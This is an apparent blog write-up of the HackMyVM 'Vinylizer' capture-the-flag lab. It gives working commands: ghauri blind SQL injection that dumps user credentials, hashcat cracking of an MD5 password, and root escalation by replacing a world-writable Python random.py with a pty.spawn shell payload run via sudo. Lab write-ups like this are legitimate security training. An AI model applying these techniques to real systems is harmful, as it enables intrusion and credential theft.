---
title: "HackMyVM - Vinylizer"
description: ""
author: raylex
tags: SQLI PYTHON BLIND-SQLI
categories: CTF HACKMYVM
date: 2024-02-02
---
![vinylizer](/assets/images/vinylizer.png)
## Enumeration
I'll begin with a Nmap scan
```shell
nmap -SCV 192.168.56.4

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 09:55 WAT
Nmap scan report for 192.168.56.4
Host is up (0.0012s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Vinyl Records Marketplace
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```
### 80 - HTTP
Inputting `admin'` as the username to test for SQLi returns internal server error which suggests the target may be vulnerable to [blind sql injection](https://portswigger.net/web-security/sql-injection/blind). 
This type of SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
## Foothold
### Blind SQLi using Ghauri
I'll fire up [Ghauri](https://github.com/r0oth3x49/ghauri), copy the login HTTP request to a text file by intercepting the request with [Caido - A lightweight web security auditing toolkit](https://caido.io/), and begin testing  
![caido](/assets/images/vinylyzer-caido-request.png){: w="700" h="400" }  
The first thing i have to do is confirm the target is vulnerable to SQLi.  
I'll use the `--dbs` option which will perform sql injecton tests on the target and attempt to enumerate available databases, i'll also use the option `-r` to specify the request file `req.txt` i created earlier and option `-p` to specify the parameter i want to test which is username
```shell
ghauri -r req.txt -p username --dbs
```
The test is successful and i can see that the target is indeed vulnerable.  
The backend DBMS is identified to be `MySQL` 
![ghauri](/assets/images/vinylyzer-ghauri-sqli.png){: w="700" h="400" }  
Further down i can see a list of available databases
```shell
available databases [3]:
[*] performance_schema
[*] information_schema
[*] vinyl_marketplace
```
The `performance_schema` and `information_schema` databases are standard MySQL dbs, so the target db is `vinyl_marketplace`.  
I'll list the tables available on the database using option `--tables`, option `--dbms` to specify the target's DBMS and option `-D` to specify the database
```shell
ghauri -r req.txt -p username --dbms mysql -D vinyl_marketplace --tables

Database: vinyl_marketplace
[1 tables]
+-------+
| users |
+-------+
```
The target db contains a single table `users`, i'll dump the table using the option `--dump` and specify the target table with the option `-T`
```shell
ghauri -r req.txt -p username --dbms mysql -D vinyl_marketplace -T users --dump

Database: vinyl_marketplace
Table: users
[2 entries]
+----+-----------+----------------------------------+----------------+
| id | username  | password                         | login_attempts |
+----+-----------+----------------------------------+----------------+
| 1  | shopadmin | 9432522ed1a8fca612b11c3980a031f6 | 0              |
| 2  | lana      | password123                      | 0              |
+----+-----------+----------------------------------+----------------+
```
The `users` table contains 2 rows; `shopadmin` and `lana` .   
Attempt to login into the web app is successful for both users but it yields nothing.  
The shopadmin's password is an md5 hash, i'll crack this hash using [hashcat](https://hashcat.net/hashcat/) tool and [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) wordlist
```shell
hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" ./rockyou.txt

Cracked: addicted2vinyl
```
>-a 0 -> straight attack mode  
>-m 0 -> md5 hash mode

I'll login as `shopadmin` via `SSH` and retrieve the user flag
```shell
shopadmin@vinylizer:~$ cat user.txt
I_******L5
```
## Privilege Escalation 
- - -
Listing the sudo privileges, i see that user `shopadmin` may run command `/usr/bin/python3 /opt/vinylizer.py` as root without password  
![sudoers](/assets/images/vinylyzer-sudoers.png){: w="700" h="400" }  
### Analysis of /opt/vinylizer.py
The program seems to be a simple command-line tool for managing a collection of vinyl records, allowing users to add, delete, list, and randomize albums and their sides. The data is stored in a JSON file `config.json`. 
The program imports two modules `json` and `random`.  I'll check where these modules are loaded from 
```python
shopadmin@vinylizer:~$ python3
Python 3.10.12 (main, Nov 20 2023, 15:14:05) [GCC 11.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import json; import random; json; random
<module 'json' from '/usr/lib/python3.10/json/__init__.py'>
<module 'random' from '/usr/lib/python3.10/random.py'>
>>>
```
`json` is loaded from `/usr/lib/python3.10/json/__init__.py` and only the root user has write access to it,  
![json.py](/assets/images/vinylyzer-json.png){: w="700" h="400" }  
`random` is loaded from `/usr/lib/python3.10/random.py` and all users have write access to it.  
![random.py](/assets/images/vinylyzer-random.png){: w="700" h="400" }  
This basically means if i  put a malicious code in `/usr/lib/python3.10/random.py` run `sudo /usr/bin/python3 /opt/vinylizer.py`, the malicious `random.py` will be executed as the root user when python attempts to import the module
### Shell as root
I'll make a backup of `/usr/lib/python3.10/random.py`
```shell
cp /usr/lib/python3.10/random.py /home/shopadmin
```
...and modify the the original code into:
```python
import pty
pty.spawn("/bin/bash")
```
Now all i have to do is run the `/opt/vinylizer.py` program with sudo  
![root-shell](/assets/images/vinylyzer-root.png){: w="700" h="400" }  
...and retrieve root flag
```shell
root@vinylizer:/home/shopadmin# cat /root/root.txt
4U*****L3
```
And that's it! I hope it helps, thanks for reading!!!